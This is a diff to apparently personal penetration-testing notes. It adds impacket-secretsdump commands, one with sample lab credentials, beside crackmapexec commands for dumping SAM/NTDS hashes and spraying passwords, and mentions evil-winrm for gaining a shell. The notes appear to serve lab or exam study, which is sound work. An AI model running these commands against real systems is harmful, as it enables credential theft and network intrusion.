@@ -274,9 +274,14 @@ a. Network Exploitation
 		Dump credentials: This tries to dump SAM/NTDS database hashes, which can be cracked offline to reveal plaintext passwords:
 		crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --sam
 		crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --ntds
-		
+
+		Dump Even more credentials:
+		impacket-secretsdump domain/username:password@IPADDRESS
+		impacket-secretsdump medtech/joe:Flowers1@172.16.229.11 
+
 		Password Spraying: Password spraying involves attempting a single password against multiple user accounts, avoiding account lockouts due to multiple failed authentication attempts:
 		crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
+
 
 		e.) evil-winrm
 		 If you got a username/password with hash and you want to get a shell from it, like a CMD/Powershell... you can use evil-winrm
